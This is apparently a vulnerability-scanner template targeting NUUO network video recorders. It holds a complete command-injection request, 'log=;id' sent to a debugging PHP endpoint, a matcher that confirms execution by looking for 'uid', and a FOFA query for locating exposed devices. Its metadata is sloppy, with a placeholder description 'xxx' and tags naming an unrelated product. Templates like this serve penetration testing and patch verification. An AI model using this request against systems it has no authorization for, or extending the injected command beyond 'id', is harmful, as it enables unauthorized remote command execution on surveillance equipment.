id: NUUO

info:
  name: NUUO摄像头
  author: mike
  severity: critical
  description: xxx
  metadata:
    max-request: 1
    verified: true
    fofa-query: title="Network Video Recorder Login "
  tags: cnvd,cnvd2023,hongjing,hcm

http:
  - raw:
      - |
        GET /__debugging_center_utils___.php?log=;id HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept: */*
        Connection: Keep-Alive
        
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "uid"
